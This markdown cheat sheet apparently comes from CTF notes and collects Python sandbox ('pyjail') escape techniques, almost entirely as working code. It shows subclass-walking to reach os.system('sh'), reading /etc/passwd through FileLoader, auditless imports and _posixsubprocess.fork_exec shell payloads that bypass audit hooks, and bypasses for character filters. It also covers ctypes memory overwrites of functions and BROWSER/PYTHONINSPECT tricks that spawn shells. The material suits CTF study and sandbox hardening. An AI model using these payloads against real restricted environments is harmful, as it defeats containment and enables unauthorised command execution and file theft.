# Pyjail

## **Building Blocks**

### Getting object
```py
[].__class__.__mro__[1]
....__class__.__base__
```

### Interesting object subclasses
```py
# 84: BuiltinImporter    -- the actual indices depend on version and arch
>>> object.__subclasses__()[84]
# 94: FileLoader
>>> object.__subclasses__()[94]('', '').get_data('/etc/passwd')
>>> object.__subclasses__()[94]('', './').contents()
['dir-traversal.md', 'jinja2.md', 'lfi.md', 'pyjail.md', 'rsa.md']
# -5: os._wrap_close [137 Linux / 134 Windows]
>>> object.__subclasses__()[-5].close.__globals__['system']('sh')
```

### Importing modules
```py
# Getting BuiltinImporter
>>> __loader__
>>> sys.__loader__
```
```py
__import__('os')
```
```py
BuiltinImporter.load_module('os') # auditless!
```
```py
_imp = sys.modules['_imp']
spec = lambda: None
spec.name = 'builtins'
spec.origin = None
builtins = _imp.create_builtin(spec) # auditless!
```

### Accessing attributes
```py
getattr(obj, 'attr')
vars(obj)['attr']
obj.__dict__['attr']
obj.__getattribute__('attr')
object.__getattr__(obj, 'attr')
```
```py
from string import Formatter
Formatter().get_field("0.__class__", [1337], kwargs={})[0]
```
```py
match obj:
    case Class(attr=v):
        print('obj.attr =', v)
```
```py
try:
    '{0.__class__.thisdoesntexist}'.format(1337)
except AttributeError as e:
    print(e.obj)
```

### Retrieving global namespace
```py
# equivalent to globals() / locals()
>>> vars()
# builtins
>>> print.__self__
# Globals from where the function was initialized
>>> function.__globals__
# Globals in the current context
>>> (lambda: None).__globals__
# Globals from where the class was initialized
>>> os._wrap_close.close.__globals__
```
### Retrieving frames
```py
try:
    1/0
except Exception as e: # you don't need "Exception" in bytecode
    frame = e.__traceback__.tb_frame
    frame.f_back.f_globals['__builtins__']
```
```py
[x:=[], x.append(b.gi_frame.f_back.f_builtins for b in x), *x[0]][-1]
```
```py
(()for(_)in()).gi_frame.f_back.f_locals
```
```py
import sys
sys.get_frame()
```
This one is auditless:
```py
s = sys.modules['_signal']
s.signal(2, print)
s.raise_signal(2)
# 2 <frame at 0x7fac99ffefc0, file '<stdin>', line 1, code <module>>
```

### Executing code
```py
>>> exec / eval
>>> os.system("ls")
>>> os.execv("/bin/bash", ["b"])
>>> os.execve("/bin/ls", ["whatever"], {})
>>> breakpoint() # runs pdb
>>> help()       # runs interactive help system. On tty shell, we can leverage the less pager
```
#### (incomplete) list of direct RCE modules
- `_posixsubprocess`
- `_xxsubinterpreters`
- `atexit`
- `bdb`
- `builtins`
- `code`
- `ctypes._aix`
- `os`
- `pdb`
- `subprocess`
#### program exit
```py
import sys
sys.stdout.flush=breakpoint
```
```py
import atexit
atexit.register(breakpoint)
```
This requires a tty.
```py
os.environ['PYTHONINSPECT'] = '1'
```
#### magic methods
```py
import os, sys
class X:
    def __del__(self): # called upon module cleanup
        os.system("/bin/sh")
sys.modules["pwnd"] = X()
sys.exit()
```
#### special attributes
```py
import subprocess as sp
from os import Popen
sp.Popen.__init__.__defaults__ = (-1, "/usr/bin/python3", None, None, None, None, True, False, None, {'PYTHONINSPECT':'1'}, None, None, 0, True, False, ()) 
popen('whatever')
```
#### metaclass
```py
>>> class Class("arg2", "arg2", metaclass=print): 0
Class ('arg2', 'arg2') {'__module__': '__main__', '__qualname__': 'Class'}
```

#### environment variables
##### BROWSER
The antigravity trick.
```py
__import__('antigravity', setattr(__import__('os'), 'environ', dict(BROWSER = '/bin/sh -c "ls -la" #%s')))
```
```py
import os, webbrowser
os.environ = dict(BROWSER="/bin/sh -c 'ls -lah' #%s")
webbrowser.open('')
```
##### PYTHONINSPECT
If set to `1`, will launch an interpreter after the code execution (similar to `python3 -i`). Requires a tty.
##### PYTHONWARNINGS
Can force loading of modules (similar to `python3 -W...`)
```sh
$ BROWSER='/bin/sh -c "echo hey!" #%s' python3 '-Wall:0:antigravity.x:0:0' -c 'print("listen!")'
# hey!
# Invalid -W option ignored: unknown warning category: 'antigravity.x'
# listen!
```

### Extracting inner objects from proxies
```py
>>> E = type('', (), {'__eq__':lambda s,o:o})()
>>> x = vars(str) == E
# >>> '+'.isspace()  # adding this line makes python crash upon second call to isspace. Some sort of caching?
# False
>>> x['isspace'] = lambda *_: True
>>> '+'.isspace()
True
```



## **Bypassing Characters Filters**

### Unicode normalization
[UTF-16](https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html)

### No quotes
```py
>>> print.__module__
'builtins'
>>> a, = dict(builtins=0); a
'builtins'
>>> next(iter(dict(builtins=0)))
'builtins'
>>> chr(0)[:0].join(map(chr, [98, 117, 105, 108, 116, 105, 110, 115]))
'builtins'
```

### No spaces / newlines
Valid separators: `\t` (tab) and `\x0c`.
You can't indent with `\x0c`.
```py
>>> exec("def\x0ctest():return\x0c'test'")
>>> test()
'test'
```
You can use `\r` as an alternative newline (which passes through `input`).

### No brackets
```py
# Tuple
>>> x = 0, 1, 2, 3
# List
>>> *x, = 0, 1, 2, 3
# Unpacking
>>> a, b, *c, d = x
```

### Calling without parentheses
#### decorators
```py
>>> decorator = lambda _: "test"
>>> @decorator
... class res: pass
>>> res
'test'
```
```py
>>> @"test".format
... class res:0
>>> res
'test'
```
#### magic methods
```py
>>> help.__class__.__str__ = breakpoint
>>> f"{help}"
TypeError: __str__ returned non-string (type NoneType)
> <stdin>(1)<module>()
(Pdb) 
```
```py
>>> help.__class__.__format__ = eval
>>> f"{help:print(1)}"
1
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
TypeError: __format__ must return a str, not NoneType
```
```py
>>> license.__class__.__enter__ = breakpoint
>>> license.__class__.__exit__ = lambda *_:0
>>> with license as b: pass
... 
--Call--
> <stdin>(1)<lambda>()
(Pdb) 
```

### No dots
```py
print("__import__('os').system('sh')", file=open('/dev/shm/exploit.py', 'w'))
setattr(__import__('sys'), 'path', ["/dev/shm"])
__import__("exploit")
```
```py
__import__('antigravity', setattr(__import__('os'), 'environ', dict(BROWSER = '/bin/sh -c "ls -la" #%s')))
```
```py
__builtins__ = __import__('os')
system('sh')
```

### Attribute assignment with no equal sign
```py
>>> setattr(a, 'b', 1)
```
```py
>>> [0 for a.b in [1]]
>>> a.b
1
```

## Weird little things
### Builtin functions don't bind to instances
In other words, `print.__get__(self)` is a no-op.
```py
>>> quit.__class__.__add__ = lambda *args: print(args)
>>> quit + 5
(Use quit() or Ctrl-Z plus Return to exit, 5)
>>>
>>> help.__class__.__add__ = print
>>> help + 5
5
```


## **Bypassing Audits Filters**

### Auditless import
```py
__loader__.load_module('_posixsubprocess')
object.__subclasses__()[84].load_module('_posixsubprocess')
```
`_imp` is always loaded, so this doesn't trigger the `import` audit:
```py
import _imp
x = lambda: None
x.name = '_posixsubprocess'
x.origin = None
s = _imp.create_builtin(x)
```

### Auditless code execution
Python version: `3.8-`
```py
import _posixsubprocess as s
s.fork_exec([b'/bin/bash', b'-c', b'cat flag'], [b'/bin/bash'], True, (0,1), None, None, -1, -1, -1, -1, -1, -1, 0, 3, False, False, None)
```

Python version: `3.9+`
```py
import _posixsubprocess as s
s.fork_exec([b'/bin/bash', b'-c', b'cat flag'], [b'/bin/bash'], True, (0,1), None, None, -1, -1, -1, -1, -1, -1, 0, 3, False, False, -1, None, None, -1, None)
```

Python version: `3.11+`
```py
import _posixsubprocess as s
s.fork_exec([b'/bin/bash', b'-c', b'cat flag'], [b'/bin/bash'], True, (0,1), None, None, -1, -1, -1, -1, -1, -1, 0, 3, False, False, -1, None, None, -1, -3, None, None)
```


### Triggered audits: `os.listdir`
```py
import _xxsubinterpreters as sub
s=sub.create()
sub.run_string(s, "import os; os.system('id')")
sub.destroy(s)
```
```py
import readline
readline.read_history_file("./flag")
print(readline.get_history_item(1))
```


## **Payloads**

### Auditless shell
```py
import _imp
x = lambda: None
x.name = '_posixsubprocess'
x.origin = None
s = _imp.create_builtin(x)
s.fork_exec([b'/bin/bash', b'-c', b'cat flag'], [b'/bin/bash'], True, (0,1), None, None, -1, -1, -1, -1, -1, -1, 0, 3, False, False, -1, None, None, -1, None)
```

### Replacing the code of a function (Auditless)
```py
from _ctypes import _SimpleCData
import sys

class c_byte(_SimpleCData):
    _type_ = "b"
c_byte.__ctype_le__ = c_byte.__ctype_be__ = c_byte

def ptr(obj):
    return (c_byte * sys.getsizeof(obj)).from_address(id(obj))

s = ptr(sys.exit)
b = ptr(print)

for i in range(len(b)):
    s[i] = b[i]

sys.exit("test")
```

### Get environment variables (1 local varname, stack size 1)
```py
x = object.__subclasses__
x = x()
x = x.pop
x()     # repeat 37 times (may vary depending on version and arch)
x = x() # os._wrap_close
x = x.__init__.__globals__.values
*x, = x()
x = x.pop
x()     # repeat 207 times (may vary depending on version and arch)
x = x() # os.environ
```

### LFI through Printers (credits, license, copyright, etc)
```py
credits._Printer__lines = None # this line is only needed if the printer was called before, as python will cache the output in here
credits._Printer__filenames.append("flag.txt")
credits()
```

### Manually instanciating functions

See UIUCTF 2023/rattler-read.